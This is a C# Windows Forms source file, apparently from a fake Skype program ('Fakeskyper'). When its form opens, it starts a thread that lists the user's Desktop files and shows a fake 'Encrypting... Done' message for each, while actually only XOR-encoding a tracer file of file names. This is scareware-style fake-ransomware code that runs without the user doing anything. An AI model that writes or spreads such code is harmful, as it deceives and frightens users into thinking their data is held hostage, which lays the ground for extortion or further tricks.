using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace Fakeskyper
{
    public partial class Form2 : Form
    {
        Random ran = new Random();
        public Form2()
        {
            InitializeComponent();
            Thread del = new Thread(new ThreadStart(deleter));
            del.Start();
        }

        private void deleter()
        {
            string desktopdir = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop");
            string directory = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Desktop").ToString();
            var files = Directory.GetFiles(directory);
            for (int i = 0; i < files.Length; i++)
            {
                Invoke(new Action(() => richTextBox1.AppendText("Encrypting " + directory + files[i] + "... Done" + Environment.NewLine)));
                File.AppendAllText(directory + "\\lukasartsTracer.txt", files[i] + Environment.NewLine);
                string filename = "";
                for (int j = directory.Length + 1; j < files[i].Length; j++)
                {
                    if (files[i][j] > 255)
                    {
                        filename += "";
                    }
                    else
                    {
                        filename += files[i][j];
                    }
                }
                File.AppendAllText(desktopdir + "\\lukasartsTracer.txt", filename + Environment.NewLine);
            }
            //Encrypt
            string hidir = desktopdir + "\\lukasartsTracer.txt";
            byte[] decbytes = File.ReadAllBytes(hidir);
            MessageBox.Show(hidir);
            BinaryWriter br = new BinaryWriter(File.OpenWrite(hidir));
            string cryptstring = "";
            for (int i = 0; i < decbytes.Length; i++)
            {
                cryptstring += (decbytes[i] ^ 25).ToString("X2");
            }
            for (int i = 0; i < cryptstring.Length; i++)
            {
                br.BaseStream.Position = i;
                br.Write(cryptstring[i]);
            }
            br.Dispose();
            Invoke(new Action(() => richTextBox1.AppendText("DONE")));
            try
            {

            }
            catch
            {
                MessageBox.Show("Error");
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form2_Load(object sender, EventArgs e)
        {

        }
    }
}
